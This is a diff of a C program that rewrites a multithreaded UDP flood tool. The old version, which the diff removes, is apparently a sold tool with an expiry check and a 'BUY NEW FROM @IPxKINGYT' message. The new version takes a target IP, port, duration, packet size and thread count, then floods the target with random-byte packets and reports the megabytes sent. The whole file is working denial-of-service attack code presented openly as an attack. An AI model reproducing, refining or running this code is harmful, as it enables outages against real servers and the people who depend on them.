@@ -1,123 +1,151 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
 #include <pthread.h>
 #include <unistd.h>
-#include <arpa/inet.h>
+#include <signal.h>
 #include <time.h>
+#include <stdatomic.h>
 
-#define MAX_THREADS 800
-#define PAYLOAD_SIZE 1024  // Optimal payload size for most networks
-
-// Expiry date (Format: YYYY-MM-DD)
-#define EXPIRY_DATE "2025-01-31"
-
-// Define the AttackParams structure
+// Structure to store attack parameters
 typedef struct {
-    char ip[16];
-    int port;
+    char *target_ip;
+    int target_port;
     int duration;
-} AttackParams;
+    int packet_size;
+    int thread_id;
+} attack_params;
 
-// Function to check if the current date is past the expiry date
-int is_expired() {
-    struct tm expiry_tm = {0};
-    struct tm current_tm = {0};
+// Global variables
+volatile int keep_running = 1;
+atomic_long total_data_sent = 0;
 
-    // Set the expiry date (hardcoded)
-    strptime(EXPIRY_DATE, "%Y-%m-%d", &expiry_tm);
-    // Get the current date
-    time_t now = time(NULL);
-    localtime_r(&now, &current_tm);
+// Signal handler to stop the attack
+void handle_signal(int signal) {
+    keep_running = 0;
+}
 
-    // Compare current date with expiry date
-    if (difftime(mktime(&current_tm), mktime(&expiry_tm)) > 0) {
-        return 1;  // Expired
+// Function to generate a random payload
+void generate_random_payload(char *payload, int size) {
+    for (int i = 0; i < size; i++) {
+        payload[i] = rand() % 256;  // Random byte between 0 and 255
     }
-    return 0;  // Not expired
 }
 
-// Function to generate a powerful, randomized payload
-void generate_payload(char* payload, int size) {
-    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=<>?;:,.";
-    for (int i = 0; i < size - 1; i++) {
-        payload[i] = charset[rand() % (sizeof(charset) - 1)];
+// Function to monitor total network usage in real time
+void *network_monitor(void *arg) {
+    while (keep_running) {
+        sleep(1);  // Update every second
+        long data_sent_in_bytes = total_data_sent;
+        double data_sent_in_mb = data_sent_in_bytes / (1024.0 * 1024.0);
+        printf("Total data sent so far: %.2f MB\n", data_sent_in_mb);
     }
-    payload[size - 1] = '\0'; // Null-terminate the payload string
+    pthread_exit(NULL);
 }
 
-// Callback function for libcurl to discard the response body
-size_t discard_response(void* ptr, size_t size, size_t nmemb, void* userdata) {
-    return size * nmemb;
-}
-
-// Thread function to send payload
-void* send_payload(void* arg) {
-    AttackParams* params = (AttackParams*)arg;
+// Function to perform the UDP flooding
+void *udp_flood(void *arg) {
+    attack_params *params = (attack_params *)arg;
     int sock;
     struct sockaddr_in server_addr;
-    char payload[PAYLOAD_SIZE];
+    char *message;
 
-    // Generate a powerful randomized payload
-    generate_payload(payload, PAYLOAD_SIZE);
-
-    sock = socket(AF_INET, SOCK_DGRAM, 0); // UDP socket
+    // Create a UDP socket
+    sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) {
         perror("Socket creation failed");
-        pthread_exit(NULL);
+        return NULL;
     }
 
+    // Set up server address structure
+    memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(params->port);
-    server_addr.sin_addr.s_addr = inet_addr(params->ip);
+    server_addr.sin_port = htons(params->target_port);
+    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);
 
-    time_t start_time = time(NULL);
-    while (time(NULL) - start_time < params->duration) {
-        if (sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
-            perror("Send failed");
-            continue; // Retry instead of breaking
-        }
+    if (server_addr.sin_addr.s_addr == INADDR_NONE) {
+        fprintf(stderr, "Invalid IP address.\n");
+        close(sock);
+        return NULL;
     }
 
+    // Allocate memory for the flooding message
+    message = (char *)malloc(params->packet_size);
+    if (message == NULL) {
+        perror("Memory allocation failed");
+        close(sock);
+        return NULL;
+    }
+
+    // Generate random payload
+    generate_random_payload(message, params->packet_size);
+
+    // Time-bound attack loop
+    time_t end_time = time(NULL) + params->duration;
+    while (time(NULL) < end_time && keep_running) {
+        sendto(sock, message, params->packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
+        atomic_fetch_add(&total_data_sent, params->packet_size);
+    }
+
+    free(message);
     close(sock);
     pthread_exit(NULL);
 }
 
-// Main function
-int main(int argc, char* argv[]) {
-    if (argc != 4) {
-        printf("Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
-        return 1;
+int main(int argc, char *argv[]) {
+    // Validate arguments
+    if (argc != 6) {
+        printf("Usage: %s [IP] [PORT] [TIME] [PACKET_SIZE] [THREAD_COUNT]\n", argv[0]);
+        return EXIT_FAILURE;
     }
 
-    // Check if the program is expired
-    if (is_expired()) {
-        printf("BUY NEW FROM @IPxKINGYT\n");
-        return 1;
+    // Parse input arguments
+    char *target_ip = argv[1];
+    int target_port = atoi(argv[2]);
+    int duration = atoi(argv[3]);
+    int packet_size = atoi(argv[4]);
+    int thread_count = atoi(argv[5]);
+
+    if (packet_size <= 0 || thread_count <= 0) {
+        fprintf(stderr, "Invalid packet size or thread count.\n");
+        return EXIT_FAILURE;
     }
 
-    AttackParams params;
-    strcpy(params.ip, argv[1]);
-    params.port = atoi(argv[2]);
-    params.duration = atoi(argv[3]);
+    // Setup signal handler
+    signal(SIGINT, handle_signal);
 
-    pthread_t threads[MAX_THREADS];
+    // Array of thread IDs
+    pthread_t threads[thread_count];
+    attack_params params[thread_count];
 
-    printf("Launching attack on %s:%d for %d seconds with %d threads and payload size %d bytes...\n",
-           params.ip, params.port, params.duration, MAX_THREADS, PAYLOAD_SIZE);
+    // Create a thread for network monitoring
+    pthread_t monitor_thread;
+    pthread_create(&monitor_thread, NULL, network_monitor, NULL);
 
-    for (int i = 0; i < MAX_THREADS; i++) {
-        if (pthread_create(&threads[i], NULL, send_payload, &params) != 0) {
-            perror("Thread creation failed");
+    // Launch multiple threads for flooding
+    for (int i = 0; i < thread_count; i++) {
+        params[i].target_ip = target_ip;
+        params[i].target_port = target_port;
+        params[i].duration = duration;
+        params[i].packet_size = packet_size;
+        params[i].thread_id = i;
+
+        if (pthread_create(&threads[i], NULL, udp_flood, &params[i]) != 0) {
+            fprintf(stderr, "Failed to create thread %d\n", i);
         }
     }
 
-    for (int i = 0; i < MAX_THREADS; i++) {
+    // Wait for all threads to finish
+    for (int i = 0; i < thread_count; i++) {
         pthread_join(threads[i], NULL);
     }
 
-    printf("Attack completed on %s:%d for %d seconds.\n",
-           params.ip, params.port, params.duration);
+    // Stop the network monitor thread
+    keep_running = 0;
+    pthread_join(monitor_thread, NULL);
 
-    return 0;
+    printf("Attack finished. All threads stopped.\n");
+    return EXIT_SUCCESS;
 }
